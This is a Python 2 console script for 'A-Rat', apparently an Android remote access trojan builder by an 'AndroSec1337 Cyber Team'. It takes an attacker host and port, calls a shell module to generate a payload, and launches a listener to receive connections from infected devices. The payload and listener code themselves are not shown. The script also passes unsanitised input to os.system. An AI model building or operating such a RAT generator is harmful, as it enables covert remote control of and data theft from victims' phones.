#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os, sys, subprocess
from time import sleep
os.system("clear")
reload(sys)
sys.setdefaultencoding("utf-8")

host = " "
port = " "
output = " "

def logo():
 print("""
\t  _____        ____    _____  _______
\t /$$$$$\      |$$$$\  /$$$$$\ $$$$$$$
\t |$   $| ____ |$  $|  |$   $|    $|
\t |$$$$$| $$$$ |$$$$/  |$$$$$|    $|
\t |$   $|      |$  $\  |$   $|    $|
\t |$   $|      |$   $\ |$   $|    $|

\t [*] Versions : 1.0.0
\t [*] Coded By ./Xi4u7
\t [*] AndroSec1337 Cyber Team
  """)

def help():
 print("""
  Commands :
       set HOST       : Set Your Host (e.g set HOST 127.0.0.1)
       set PORT       : Set Your Port (e.g set PORT 1337)
       set OUTPUT     : Set Your Output Name And Path (e.g set OUTPUT /home/payload)
       show values    : Show Host, Port And Output Value
       start listener : Start Your Conection Server 

  Please Report This bug To My FB
  FB : https://m.facebook.com/sefina.dewi
  FP : https://m.facebook.com/androsec1337cyberteam\n""")
       
def main():
    global host, port, output

    while True:
        cmd = raw_input("[*] A-Rat@AndroSec1337:~# ").lower()

        if cmd == "help":
            help()

        elif cmd == 'banner':
            os.system("clear")
            logo()
            main()

        elif "clear" in cmd:
            os.system("clear")

        elif "set host" in cmd:
            host = cmd.split()[-1]

        elif "set port" in cmd:
            port = int(cmd.split()[-1])

        elif "set output" in cmd:
            output = cmd.split()[-1]

        elif cmd == "show values":
            print "\n[+] HOST   : %s\n[+] PORT   : %s\n[+] OUTPUT : %s\n"%(host, port,output)

        elif cmd == "generate payload" or cmd == "generate":
            if host != " " and port != " " and output != " ":
                print("[+] Generating Payload . . .")
                sleep(1)
                print("[*] Using Configuration . . .\n |_ HOST   : "+host+"\n |_ PORT   : "+str(port)+"\n |_ OUTPUT : "+output)
                sleep(3)
                os.system("sh modules/gen.sh "+host+" "+str(port)+" "+output)
                print("[+] Generating Success . . .")
                sleep(1)
                main()
            else:
                print "\n[!] HOST   : %s\n[!] PORT   : %s\n[!] OUTPUT : %s\n"%(host,port,output)

        elif cmd == "start" or cmd == "run" or cmd == "start listener":
            if host != " " and port != " ":
                if os.name == "nt":
                    subprocess.Popen([sys.executable, 'modules/listener.py', host, str(port)], creationflags=subprocess.CREATE_NEW_CONSOLE)
                else:
                    os.system(sys.executable + " modules/listener.py %s %s"%(host, str(port)))
            else:
                print "\n[!] Host : %s\n[!] Port : %s\n"%(host,port)
        else:
            print("[!] Check Your Command . . .")
            main()

def contol():
    try:
        logo()
        main()
    except KeyboardInterrupt:
        print("\n[!] CTRL+C Detect Exiting Tools . . .")
        sleep(2)
        sys.exit()
if __name__ == "__main__":
    contol()
